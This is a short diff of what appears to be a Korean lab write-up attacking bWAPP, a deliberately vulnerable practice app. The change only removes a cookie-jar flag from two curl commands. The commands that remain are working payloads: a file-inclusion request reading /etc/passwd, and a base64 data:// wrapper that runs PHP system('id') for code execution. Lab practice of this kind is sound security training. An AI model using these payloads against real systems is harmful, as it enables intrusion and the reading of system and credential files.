@@ -65,7 +65,6 @@
 # language 파라미터에 절대 경로 파일 삽입
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      "http://192.168.0.20/bWAPP/rlfi.php?language=/etc/passwd&action=go" | grep -i -A 10 "root:"
 ```
 
@@ -90,7 +89,6 @@ sys:x:3:3:sys:/dev:/bin/sh
 # data:// 래퍼를 사용하여 서버 공격 및 RCE 권한 증명
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      "http://192.168.0.20/bWAPP/rlfi.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==&action=go" | grep -i "uid="
 ```
 
